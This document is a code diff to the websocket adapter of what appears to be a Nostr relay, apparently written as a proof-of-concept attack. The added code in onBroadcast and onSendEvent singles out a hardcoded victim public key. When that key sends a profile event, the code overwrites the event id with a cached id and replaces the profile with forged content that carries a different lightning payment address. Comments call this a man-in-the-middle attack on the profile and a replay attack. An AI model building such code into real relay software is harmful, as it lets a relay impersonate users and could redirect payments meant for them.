@@ -11,12 +11,12 @@ import { IWebSocketAdapter, IWebSocketServerAdapter } from '../@types/adapters'
 import { SubscriptionFilter, SubscriptionId } from '../@types/subscription'
 import { WebSocketAdapterEvent, WebSocketServerAdapterEvent } from '../constants/adapter'
 import { attemptValidation } from '../utils/validation'
-import { ContextMetadataKey } from '../constants/base'
+import {ContextMetadataKey, EventKinds} from '../constants/base'
 import { createLogger } from '../factories/logger-factory'
 import { Event } from '../@types/event'
 import { getRemoteAddress } from '../utils/http'
 import { IRateLimiter } from '../@types/utils'
-import { isEventMatchingFilter } from '../utils/event'
+import { getEventHash, isEventMatchingFilter } from '../utils/event'
 import { messageSchema } from '../schemas/message-schema'
 import { Settings } from '../@types/settings'
 import { SocketAddress } from 'net'
@@ -101,24 +101,80 @@ export class WebSocketAdapter extends EventEmitter implements IWebSocketAdapter 
   }
 
   public onBroadcast(event: Event): void {
-    this.webSocketServer.emit(WebSocketServerAdapterEvent.Broadcast, event)
-    if (cluster.isWorker && typeof process.send === 'function') {
-      process.send({
-        eventName: WebSocketServerAdapterEvent.Broadcast,
-        event,
-      })
+    console.log('---------')
+    console.log('event on onBroadcast on web-socket-adapter.ts')
+    console.log(event)
+
+    // victim public key in hex string
+    // same as npub1ynert69p79kulwzujknnsllsvxp9rxquw3y2sjsgakq935etf4ksrj7sm4
+    const cached_event_id = 'd25fc8d7f67229734598d11575baebba0ac52da1d67d7a7cdc3fa63f4b3b251e'
+    const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d'
+    if(event.kind==0 && event.pubkey==target_pub){
+      console.log('Do MITM on profile')
+      event.id = cached_event_id
+      event.content = '{"display_name":\
+    "","website":"","name":"Bob dash",\
+    "lud06":"lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhkx6r0wpc8jampwejnwwquw5qk9",\
+    "about":"I am not Bob"}'
+
+      console.log('MITM event')
+      console.log(event)
+      this.webSocketServer.emit(WebSocketServerAdapterEvent.Broadcast, event)
+      if (cluster.isWorker && typeof process.send === 'function') {
+        process.send({
+          eventName: WebSocketServerAdapterEvent.Broadcast,
+          event,
+        })
+      }
+    }else{
+      this.webSocketServer.emit(WebSocketServerAdapterEvent.Broadcast, event)
+      if (cluster.isWorker && typeof process.send === 'function') {
+        process.send({
+          eventName: WebSocketServerAdapterEvent.Broadcast,
+          event,
+        })
+      }
     }
   }
 
   public onSendEvent(event: Event): void {
-    this.subscriptions.forEach((filters, subscriptionId) => {
-      if (
-        filters.map(isEventMatchingFilter).some((isMatch) => isMatch(event))
-      ) {
-        debug('sending event to client %s: %o', this.clientId, event)
-        this.sendMessage(createOutgoingEventMessage(subscriptionId, event))
-      }
-    })
+    console.log('---------')
+    console.log('event on onSendEvent on web-socket-adapter.ts')
+    console.log(event)
+    // do truncated replay attack on EncryptedDM
+    // eslint-disable-next-line max-len
+    // victim public key in hex string
+    // same as npub1ynert69p79kulwzujknnsllsvxp9rxquw3y2sjsgakq935etf4ksrj7sm4
+    const cached_event_id = 'd25fc8d7f67229734598d11575baebba0ac52da1d67d7a7cdc3fa63f4b3b251e'
+    const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d'
+    if(event.kind==0 && event.pubkey==target_pub){
+      console.log('Do MITM on profile')
+      event.id = cached_event_id
+      event.content = '{"display_name":\
+    "","website":"","name":"Bob dash",\
+    "lud06":"lnurl1dp68gurn8ghj7ampd3kx2ar0veekzar0wd5xjtnrdakj7tnhv4kxctttdehhwm30d3h82unvwqhkx6r0wpc8jampwejnwwquw5qk9",\
+    "about":"I am not Bob"}'
+
+      console.log('MITM event')
+      console.log(event)
+      this.subscriptions.forEach((filters, subscriptionId) => {
+        if (
+            filters.map(isEventMatchingFilter).some((isMatch) => isMatch(event))
+        ) {
+          debug('sending event to client %s: %o', this.clientId, event)
+          this.sendMessage(createOutgoingEventMessage(subscriptionId, event))
+        }
+      })
+    }else{
+      this.subscriptions.forEach((filters, subscriptionId) => {
+        if (
+          filters.map(isEventMatchingFilter).some((isMatch) => isMatch(event))
+        ) {
+          debug('sending event to client %s: %o', this.clientId, event)
+          this.sendMessage(createOutgoingEventMessage(subscriptionId, event))
+        }
+      })
+    }
   }
 
   private sendMessage(message: OutgoingMessage): void {
